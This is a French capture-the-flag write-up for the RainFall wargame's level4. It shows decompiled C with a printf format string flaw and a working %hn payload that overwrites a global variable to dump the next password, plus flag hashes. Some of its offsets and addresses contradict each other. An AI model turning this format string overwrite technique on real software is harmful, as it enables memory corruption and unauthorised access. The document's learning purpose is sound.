# level4 :

pass : `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`

## Source :

```c
#include <stdio.h>

int m = 0;  // 0x08049814

void	p(char *str) {  // 0x08048444
	printf(str);
}

void	n() {  // 0x08048457
	char buf[520];  // ebp-0x208 | esp+0x10

	fgets(buf, 512, stdin);  // 0x200 
	p(buf);
	if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
	}
}

void	main() {  // 0x080484a7
	n();
}
```

## Recherche :

> On va vouloir remplacer la valeur de `m` pour être égale à `0x1025544`.



Comme pour le level3, on cheche l'offset qui est cette fois à `12`

```
kali@kali:~/rainfall$ ./script.sh ./level4
Index 0
Index 1
Index 2
Index 3
Index 4
Index 5
Index 6
Index 7
Index 8
Index 9
Index 10
Index 11
Index 12
AAAA41414141
```

Cette fois on veut :

- écrire à l'addresse `0x08049810`
- l'offset pour y écrire est `12`
- la valeur que l'on veut mettre est `0x1025544`

Dans l'execice précédent, on pouvait écrire les `0x40` caractères, mais maintenant c'est beaucoup plus. On va donc utiliser 

### Eploiter avec les formats modifiers `%hn` et `%<size>x`

Pour mettre cette valeur, on utilisera `%hn` qui permet d'écrire sur `2` octets.

Donc `0x5544` à l'adresse `0x08049810` et `0x0102` à l'adresse `0x08049812`.
Comme `0x5544` > `0x0102`, on les écrira dans l'ordre inverse.

- `0x0102` - `8 bits d'adresses` = `250`
- `0x5544` - `0x0102` = `21570`

On a doit dont décalé de 513 - 8 = 505 pour le second, puis de 17493 - 513 = 16980 pour le premier.

`./level4 < <(python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%16980x%13$hn"')`

## Exploit :

```
level4@RainFall:~$ (python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn"'; cat) | ./level4

.
.
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

----

## Documentation :
* [Une simple Exploitation de vulnérabilité Format String](https://www.exploit-db.com/papers/23985)
